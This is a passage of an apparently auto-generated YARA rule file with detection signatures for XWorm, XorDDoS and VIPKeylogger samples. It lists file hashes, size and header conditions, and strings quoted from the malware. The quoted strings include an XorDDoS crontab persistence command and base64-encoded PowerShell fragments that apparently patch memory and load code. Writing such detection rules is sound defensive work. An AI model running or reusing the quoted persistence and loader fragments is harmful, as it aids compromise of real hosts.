      $s14 = "syscall.procCreateProcessAsUserW" fullword ascii /* score: '17.00'*/
      $s15 = "internal/syscall/windows.procGetProcessMemoryInfo" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "4035d2883e01d64f3e7a9dccb1d63af5" and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1233b303_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_9 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1233b303.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8a9782e3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1233b30310c96a6dceef688a40a25fab6cb2f4083d2451f00f86b933601bf80d"
      hash2 = "8a9782e3cef81e3cf475f812ede556f66c9aed6e634ef70489212ddce6dad0ad"
   strings:
      $s1 = "EUgHoQiGX6aRbkPJfUtojSArZYIPnyKtnX1vPWwTLxaVms21xKoM2eUirCSTzQFr8b9LTXTJ6nCGy1n9IWeu9CWf" fullword ascii /* score: '13.00'*/
      $s2 = "irPx4u15cZpoCNmHs4qZM45G8oUEbZIMzEJAE2ljrFmIyE0iRCoxvmCITW90msoczEuMifSn9BFMmyuCpURKBxRH" fullword ascii /* score: '9.00'*/
      $s3 = "VZ9mnWwdsUXYDGmZytgve0ngX1hmkf1SZUrPeR0k9gGkpEBGmZlc5P0cBGqGJY1HB6t2bbfAKm" fullword ascii /* score: '9.00'*/
      $s4 = "axmdvVMXuPIl0buBg9DO2VLqhEvTf0BTCb8uKebojCMHespylBwBpyCPbrTImKDClGhueRtP4X" fullword ascii /* score: '9.00'*/
      $s5 = "GAUlogl77VJr6ftYUrSieeNqzMJ2tWsv4arJSTvBSKEoZvsPhNiBNx3azp28dicfmtPdy0Ql6R" fullword ascii /* score: '9.00'*/
      $s6 = "bZEbf0ADYlO8dAwINFJ18adjy7lEwDZP1iRjSnJRfmuw88WNhpAF9K2gDsPYAP7niitFRE8bbf" fullword ascii /* score: '9.00'*/
      $s7 = "n6gTTFh4ftPsl61DIazYAwFXlhn87rXUwM" fullword ascii /* score: '9.00'*/
      $s8 = "PJg7jeYe3lmh1PBCImUV3EKrBfFYmc7YLC" fullword ascii /* score: '9.00'*/
      $s9 = "kAjq2bBtWxxnJUNntHWsmnpTOdspYLAnldYRLkIMWmuowwY7" fullword wide /* score: '9.00'*/
      $s10 = "SIDkfrfhVvXzd4sMs82pNJ0TGdXLoO3wekmBH3fDqkssuliy6zvjAPimz1BgUbgOEobJCyR41fSso91Ti2LU2FDe" fullword ascii /* score: '8.00'*/
      $s11 = "IyTsNSAMpshpDRufIgQVUA3sbHxt1Dxdv28qJ4xzPly8mtAr" fullword ascii /* score: '8.00'*/
      $s12 = "d260kqOARyU4dcMS13ZBEaBOmKCH0AEwM0" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _XorDDoS_signature__XorDDoS_signature__c3714fc0_10 {
   meta:
      description = "_subset_batch - from files XorDDoS(signature).elf, XorDDoS(signature)_c3714fc0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "10e43894490d98a91f3d409a83d984556d619e91782333033ad3d7fb1b9def8b"
      hash2 = "c3714fc0446a1adaedbc86e3dd0b2121e65b34cc3d40494f709c6873fa0d56bc"
   strings:
      $s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR 1.1.4322)" fullword ascii /* score: '23.00'*/
      $s2 = "sed -i '/\\/etc\\/cron.hourly\\/gcc.sh/d' /etc/crontab && echo '*/3 * * * * root /etc/cron.hourly/gcc.sh' >> /etc/crontab" fullword ascii /* score: '22.00'*/
      $s3 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* score: '19.00'*/ /* hex encoded string '3333' */
      $s4 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s5 = "*** glibc detected *** %s: %s: 0x%s ***" fullword ascii /* score: '17.50'*/
      $s6 = "/usr/libexec/getconf" fullword ascii /* score: '17.00'*/
      $s7 = "ELF load command address/offset not properly aligned" fullword ascii /* score: '15.00'*/
      $s8 = "*** stack smashing detected ***: %s terminated" fullword ascii /* score: '15.00'*/
      $s9 = "invalid target namespace in dlmopen()" fullword ascii /* score: '14.00'*/
      $s10 = "# description: %s" fullword ascii /* score: '14.00'*/
      $s11 = "# Short-Description:" fullword ascii /* score: '14.00'*/
      $s12 = "DYNAMIC LINKER BUG!!!" fullword ascii /* score: '13.00'*/
      $s13 = "TLS generation counter wrapped!  Please report as described in <http://www.gnu.org/software/libc/bugs.html>." fullword ascii /* score: '13.00'*/
      $s14 = "%s: error: %s: %s (%s)" fullword ascii /* score: '12.50'*/
      $s15 = "symbol=%s;  lookup in file=%s [%lu]" fullword ascii /* score: '12.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__65cf34b2_XWorm_signature__c74c8dd9_11 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_65cf34b2.bat, XWorm(signature)_c74c8dd9.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "65cf34b295ed9f6c374c14b406762ca7b1f470bd3109d0137cb469137d2f06ac"
      hash2 = "c74c8dd96aa4e7310662158f9910372083379efa13ebf24e8c08bfd295b714f7"
   strings:
      $s1 = "HIAbwB0AGUAYwB0AG8AcgAgAD0AIABHAGUAdAAtAFMAdAByAGEAdwBiAGUAcgByAHkATQBlAG0AbwByAHkAUAByAG8AdABlAGMAdABpAG8AbgBGAHUAbgBjAHQAaQBvA" ascii /* score: '11.00'*/
      $s2 = "HMALAAgADgALAAgACQAYgBlAHIAcgB5AE8AbABkAFAAcgBvAHQAZQBjAHQAaQBvAG4ALAAgAFsAcgBlAGYAXQAkAGIAZQByAHIAeQBPAGwAZABQAHIAbwB0AGUAYwB0A" ascii /* score: '11.00'*/
      $s3 = "GUAKAAkAHMAdwBlAGUAdABUAHIAYQBjAGkAbgBnAEEAZABkAHIAZQBzAHMALAAgACQAcwB0AHIAYQB3AGIAZQByAHIAeQBNAG8AZABpAGYAaQBjAGEAdABpAG8AbgBMA" ascii /* score: '11.00'*/
      $s4 = "GkAbwBuAFAAbwBpAG4AdABlAHIAKAAkAFMAdAByAGEAdwBiAGUAcgByAHkARgB1AG4AYwB0AGkAbwBuAEEAZABkAHIAZQBzAHMALAAgACQAcwB0AHIAYQB3AGIAZQByA" ascii /* score: '11.00'*/
      $s5 = "GUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEUAbQBpAHQALgBBAHMAcwBlAG0AYgBsAHkAQgB1AGkAbABkA" ascii /* score: '11.00'*/
      $s6 = "EMAbwBuAHQAZQB4AHQAIgAgAC0AVgBhAGwAdQBlAE8AbgBsAHkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1A" ascii /* score: '11.00'*/
      $s7 = "C0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAoACQAYgBlAHIAcgB5AEQAZQBsA" ascii /* score: '11.00'*/
      $s8 = "HMAdAByAGEAdwBiAGUAcgByAHkARABvAG0AYQBpAG4ALgBEAGUAZgBpAG4AZQBEAHkAbgBhAG0AaQBjAEEAcwBzAGUAbQBiAGwAeQAoACQAcwB3AGUAZQB0AEEAcwBzA" ascii /* score: '11.00'*/
      $s9 = "HMAdAByAGEAdwBiAGUAcgByAHkAQQBzAHMAZQBtAGIAbAB5AEIAdQBpAGwAZABlAHIALgBEAGUAZgBpAG4AZQBEAHkAbgBhAG0AaQBjAE0AbwBkAHUAbABlACgAJABiA" ascii /* score: '11.00'*/
      $s10 = "HMAdwBlAGUAdABUAGEAcgBnAGUAdABTAGUAYwB1AHIAaQB0AHkATQBvAGQAdQBsAGUAIAAkAGIAZQByAHIAeQBJAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ARgB1A" ascii /* score: '11.00'*/
      $s11 = "HIAeQBBAHUAdABvAG0AYQB0AGkAbwBuAFUAdABpAGwAaQB0AGkAZQBzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAnAFMAYwBhAG4AQwBvAG4AdABlAG4AdAAnACwAIABbA" ascii /* score: '11.00'*/
      $s12 = "GYAdQBuAGMAdABpAG8AbgAgAEMAbwBuAGYAaQBnAHUAcgBlAC0AUwB0AHIAYQB3AGIAZQByAHIAeQBSAHUAbgB0AGkAbQBlAEUAbgB2AGkAcgBvAG4AbQBlAG4AdAAgA" ascii /* score: '11.00'*/
      $s13 = "GEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEkAbQBwAGwAQQB0AHQAcgBpAGIAdQB0A" ascii /* score: '11.00'*/
      $s14 = "FsASQBuAHQAUAB0AHIAXQA6ADoAQQBkAGQAKAAkAEIAZQByAHIAeQBUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAHMAdAByAGEAdwBiAGUAcgByAHkASQApA" ascii /* score: '11.00'*/
      $s15 = "GUAcwBzACwAIAAkAHMAdwBlAGUAdABJACkALAAgACQAcwB3AGUAZQB0AE0AbwBkAGkAZgBpAGMAYQB0AGkAbwBuAEQAYQB0AGEAWwAkAHMAdwBlAGUAdABJAF0AKQAgA" ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x7025 or uint16(0) == 0x6125 ) and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__75d930149d98b9b34c55459c6a79b293_imphash__XWorm_signature__75d930149d98b9b34c55459c6a79b293_imphash__0198c_12 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash).exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_0198cd73.exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_110c9d91.exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_629a5d51.exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_6d087586.exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_89c42dfb.exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_8f02c0fd.exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_bee6b54a.exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_c17f70dd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3254e767805e57450103750a59ec5d006d2c69ed24fa15a98e1ac0d6537f5134"
      hash2 = "0198cd73b3f21c219ac0e91f15f2ef445127bf7d646e47a07a29961f750755bf"
      hash3 = "110c9d91b85e5d92db03708c2c56d5978627238c86ed7b6728b911cdd628d6a6"
      hash4 = "629a5d51b57d61081e5e86045a36e1aec071f9fb48d306108f1a0fdfc88421e0"
      hash5 = "6d0875865d80752d7937fc320f0cdb5091840bdfeeec4ccf9d772fd73cb502ae"
      hash6 = "89c42dfbb05f7be8162e2db485ff2d70faed81989a73de3f01499446946c67ac"
      hash7 = "8f02c0fd6dad12e2beebf1b67896e5d2ba6079628ebe4de17c746f8eb7971223"
      hash8 = "bee6b54ab1e1302a7c9e48d41fb233e3d6f2ab0c421254eedb19a0101cf3b1fc"
      hash9 = "c17f70ddf13fa4eb68f0b3991b2721b5cc82d69085d95a199f1fd30b1a2613a0"
   strings:
      $s1 = "logs.txtH" fullword ascii /* score: '16.00'*/
      $s2 = "         <requestedExecutionLevel level='asInvoker' uiAccess='false'/>" fullword ascii /* score: '15.00'*/
      $s3 = "shost.exI" fullword ascii /* score: '15.00'*/
      $s4 = "MXe77Hjr3fLHXxIK416L2RQyHLJKFpD5GynmFOQr1Zas4U1kWsCYAgSuRWbILZyDllySaE" fullword ascii /* score: '9.00'*/
      $s5 = "Syka blyat. Fuck all. I hate all of you bastard. I say hi to everyone and wish you to go to hell. I hope you realize your stupid" ascii /* score: '9.00'*/
      $s6 = "Syka blyat. Fuck all. I hate all of you bastard. I say hi to everyone and wish you to go to hell. I hope you realize your stupid" ascii /* score: '9.00'*/
      $s7 = "8HrbS1ZLA8VGw0d9VOmDyJjLoGkYa124sstMNArTr7FkMEUcdtIO6yB3" fullword ascii /* score: '9.00'*/
      $s8 = "Syka blyat. Fuck all. I hate all of you bastard. I say hi to everyone and wish you to go to hell. I hope you realize your stupid" ascii /* score: '9.00'*/
      $s9 = "EcHy74ou8Iiiwff4dLLTcLjEBSqdwcOnn9A8Pop80IZG4LHQ1IkaWJ0UVDQMlA4ru8bxEJ" fullword ascii /* score: '9.00'*/
      $s10 = "XRGdBIA4Y54MpgETQTlmkVrsYo6ZdX7pIDbbMT5D54ilryOUDsJzv" fullword ascii /* score: '9.00'*/
      $s11 = "9VeCJ6w1XgMCGC5WB7DWoA9vYPFirCY6IfzFXEJfMYGgbFMabsSHOLtK" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "75d930149d98b9b34c55459c6a79b293" and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__4ae19177_XWorm_signature__b57aff2e_13 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_4ae19177.js, XWorm(signature)_b57aff2e.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4ae1917797bbcaa5d9f921feb1ff90c9c0c8780608088dbb22ca791012de20a3"
      hash2 = "b57aff2eb48e3121344494e3e4d60ce0d357c48a2a35806e9024fcac9202ebcd"
   strings:
      $s1 = "BlAGYAaQBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkAKAAkAGEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbA" ascii /* score: '11.00'*/
      $s2 = "BsAGUAZwBhAHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbA" ascii /* score: '11.00'*/
      $s3 = "BjAG8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBMAGEAbgBnAHUAYQBnAGUATQBvAGQAZQAgAD0AIAAnAEYAdQBsAGwATABhAG4AZwB1AGEAZw" ascii /* score: '11.00'*/
      $s4 = "BpAG0AaQB6AGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkADoAIAAkACgAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkAIgAgAC0ARgBvAHIAZQ" ascii /* score: '11.00'*/
      $s5 = "B1AGkAbABkAGUAcgAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8Abg" ascii /* score: '11.00'*/
      $s6 = "BuAHYAbwBrAGUAKAAkAG4AdQBsAGwALAAgAEAAKAAkAGgAYQBuAGQAbABlAFIAZQBmAGUAcgBlAG4AYwBlACwAIAAkAFAAcgBvAGMAZQBkAHUAcgBlAE4AYQBtAGUAKQ" ascii /* score: '11.00'*/
      $s7 = "BvAG4AdABlAG4AdABTAGMAYQBuAEYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AVQB0AGkAbABpAHQAaQBlAHMALgBHAGUAdABNAGUAdA" ascii /* score: '11.00'*/
      $s8 = "B0AEYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJA" ascii /* score: '11.00'*/
      $s9 = "BnAGUAcgA6ADoAVwByAGkAdABlAEIAeQB0AGUAKABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACgAJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAGkAKQ" ascii /* score: '11.00'*/
      $s10 = "B0AGkAbwBuAEEAZABkAHIAZQBzAHMALAAgAFsAVAB5AHAAZQBbAF0AXQAkAEkAbgBwAHUAdABQAGEAcgBhAG0AZQB0AGUAcgBzACwAIABbAFQAeQBwAGUAXQAkAE8AdQ" ascii /* score: '11.00'*/
      $s11 = "BjAHQAaQBvAG4AQQBkAGQAcgBlAHMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMw" ascii /* score: '11.00'*/
      $s12 = "AgAFsAYgB5AHQAZQBbAF0AXQBAACgANwAxACwAMQAwADEALAAxADEANgAsADgAMAAsADEAMQA0ACwAMQAxADEALAA5ADkALAA2ADUALAAxADAAMAAsADEAMAAwACwAMQ" ascii /* score: '11.00'*/
      $s13 = "BuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQAcwBlAHIAdgBpAGMAZQBDAG8AbgB0AGUAeAB0ACwAIAAxADYAKQANAAoAIA" ascii /* score: '11.00'*/
      $s14 = "B0AC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIAAtAFMAYwBvAHAAZQAgAEMAdQByAHIAZQBuAHQAVQBzAGUAcgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbw" ascii /* score: '11.00'*/
      $s15 = "BvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAAgACQAbABpAGIAcgBhAHIAeQBIAGEAbg" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _VIPKeylogger_signature__XWorm_signature__60a6d266_14 {
   meta:
      description = "_subset_batch - from files VIPKeylogger(signature).js, XWorm(signature)_60a6d266.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "13daad4c1352c39e0372e14c5e87e8b51f3a7ace5a0fe04d220d583b260d1697"
      hash2 = "60a6d2666a2fcff382041c20273f99cc13f1998d11522fb772eac2aeed83f37c"
   strings:
      $s1 = "GEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQAcwBlAHIAdgBpAGMAZQBDAG8AbgB0AGUAeAB0ACwAIAAxADYAKQANAAoAIAAgA" ascii /* score: '11.00'*/
      $s2 = "HQAaQBvAG4AQQBkAGQAcgBlAHMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyA" ascii /* score: '11.00'*/
      $s3 = "HYAbwBrAGUAKAAkAG4AdQBsAGwALAAgAEAAKAAkAGgAYQBuAGQAbABlAFIAZQBmAGUAcgBlAG4AYwBlACwAIAAkAFAAcgBvAGMAZQBkAHUAcgBlAE4AYQBtAGUAKQApA" ascii /* score: '11.00'*/
      $s4 = "C0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIAAtAFMAYwBvAHAAZQAgAEMAdQByAHIAZQBuAHQAVQBzAGUAcgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuA" ascii /* score: '11.00'*/
      $s5 = "G0AaQB6AGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkADoAIAAkACgAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkAIgAgAC0ARgBvAHIAZQBnA" ascii /* score: '11.00'*/
      $s6 = "HAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAAgACQAbABpAGIAcgBhAHIAeQBIAGEAbgBkA" ascii /* score: '11.00'*/
      $s7 = "EYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB2A" ascii /* score: '11.00'*/
      $s8 = "GUAZwBhAHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdA" ascii /* score: '11.00'*/
      $s9 = "GUAKABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACgAJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAG0AbwBkAGkAZgBpAGMAYQB0AGkAbwBuAEQAYQB0A" ascii /* score: '11.00'*/
      $s10 = "G4AdABlAG4AdABTAGMAYQBuAEYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AVQB0AGkAbABpAHQAaQBlAHMALgBHAGUAdABNAGUAdABoA" ascii /* score: '11.00'*/
      $s11 = "G8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBMAGEAbgBnAHUAYQBnAGUATQBvAGQAZQAgAD0AIAAnAEYAdQBsAGwATABhAG4AZwB1AGEAZwBlA" ascii /* score: '11.00'*/
      $s12 = "GUAcgA6ADoAVwByAGkAdABlAEIAeQB0AGUAKABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACgAJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAGkAKQAsA" ascii /* score: '11.00'*/
      $s13 = "FsAYgB5AHQAZQBbAF0AXQBAACgANwAxACwAMQAwADEALAAxADEANgAsADgAMAAsADEAMQA0ACwAMQAxADEALAA5ADkALAA2ADUALAAxADAAMAAsADEAMAAwACwAMQAxA" ascii /* score: '11.00'*/
      $s14 = "GkAbwBuAEEAZABkAHIAZQBzAHMALAAgAFsAVAB5AHAAZQBbAF0AXQAkAEkAbgBwAHUAdABQAGEAcgBhAG0AZQB0AGUAcgBzACwAIABbAFQAeQBwAGUAXQAkAE8AdQB0A" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__78f8b46d_VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516_15 {
   meta:
      description = "_subset_batch - from files VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_78f8b46d.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8ece82ad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "78f8b46dfdd55f7914e78f925189180f674945327ee3fa9187e2d5de86b15337"
      hash2 = "8ece82ad36ddad1e13a955098ea9629364950ed21a1155d7be4921208e62eb0c"
   strings:
      $s1 = "get_DigitalRoot" fullword ascii /* score: '12.00'*/
      $s2 = "GetDigitalRoot" fullword ascii /* score: '12.00'*/
      $s3 = "Primes_{0}_{1}.txt" fullword wide /* score: '11.00'*/
      $s4 = "Built with .NET Framework 4.0" fullword wide /* score: '10.00'*/
      $s5 = "GetFirstNPrimes" fullword ascii /* score: '9.00'*/
      $s6 = "<GetPrimesWithDigitSum>b__0" fullword ascii /* score: '9.00'*/
      $s7 = "get_IsPrime" fullword ascii /* score: '9.00'*/
      $s8 = "get_IsDeficient" fullword ascii /* score: '9.00'*/
      $s9 = "get_IsPalindromic" fullword ascii /* score: '9.00'*/
      $s10 = "get_ShowStatistics" fullword ascii /* score: '9.00'*/
      $s11 = "get_IsHappy" fullword ascii /* score: '9.00'*/
      $s12 = "GetPrimesWithDigitSum" fullword ascii /* score: '9.00'*/
      $s13 = "GetTwinPrimes" fullword ascii /* score: '9.00'*/
      $s14 = "get_IsArmstrong" fullword ascii /* score: '9.00'*/
      $s15 = "get_IsAbundant" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__259ad0de_VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516_16 {
   meta:
      description = "_subset_batch - from files VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_259ad0de.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fa979f31.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "259ad0de4cc1f77279c2efb6c3d3f5fcf7655013c8f116d25a18c697faab5f45"
      hash2 = "fa979f3180a7bd67615f665bb629c70209c5680e2163750362bc94fc1bfd9e73"
   strings:
      $s1 = "https://github.com/textmerger" fullword wide /* score: '17.00'*/
      $s2 = "Processor Count: {0}" fullword wide /* score: '17.00'*/
      $s3 = "groupBoxProcessing" fullword wide /* score: '15.00'*/
      $s4 = "TextProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "textProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "Text Processing Options" fullword wide /* score: '15.00'*/
      $s7 = ".NET Framework: 4.0.0.0" fullword wide /* score: '15.00'*/
      $s8 = "targetEncoding" fullword ascii /* score: '14.00'*/
      $s9 = "merged.txt" fullword wide /* score: '14.00'*/
      $s10 = "A Windows Forms application for merging multiple text files with customizable separators and processing options." fullword wide /* score: '11.00'*/
      $s11 = "Preview Merged Content" fullword wide /* score: '11.00'*/
      $s12 = ".NET Framework: {0}" fullword wide /* score: '10.00'*/
      $s13 = ".NET Version: {0}" fullword wide /* score: '10.00'*/
      $s14 = "Error reading file '" fullword wide /* score: '10.00'*/
      $s15 = "set_IncludeFilenameHeaders" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _VIPKeylogger_signature__XWorm_signature__c7ec9030_17 {
   meta:
      description = "_subset_batch - from files VIPKeylogger(signature).vbs, XWorm(signature)_c7ec9030.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "50f2444ef55d8aa33dbcbf6b7324237671cface9e5fe6535fe23f811ceecc48f"
      hash2 = "c7ec90308b42d5151eb07247c3085e58a299c7693997ae5a437e21d2248501e9"
   strings:
      $s1 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s2 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s3 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s4 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s5 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s6 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s7 = "= in_xmlElement.getAttribute( \"serverPassword\" )" fullword ascii /* score: '17.00'*/
      $s8 = "' Log any SMTP errors" fullword ascii /* score: '17.00'*/
      $s9 = "= in_xmlElement.getAttribute( \"reportPeriodMinutes\" ) + 0" fullword ascii /* score: '16.00'*/
      $s10 = "= in_xmlElement.getAttribute( \"serverPort\" ) + 0" fullword ascii /* score: '16.00'*/
      $s11 = "' SMTP 'To' email address. Multiple addresses are separated by commas" fullword ascii /* score: '15.00'*/
      $s12 = "End Sub ' ProcessEvent" fullword ascii /* score: '15.00'*/
      $s13 = "WScript.Echo \"No administrator defined. Ignoring \" & in_strEmailSubject" fullword ascii /* score: '13.00'*/
      $s14 = "= in_xmlElement.getAttribute( \"formatAsHtml\" ) + 0" fullword ascii /* score: '13.00'*/
      $s15 = "' Optional password (may be required for SMTP authentication)" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__911d8e4c_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a74_18 {
   meta:
      description = "_subset_batch - from files VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_911d8e4c.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_deb7e161.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
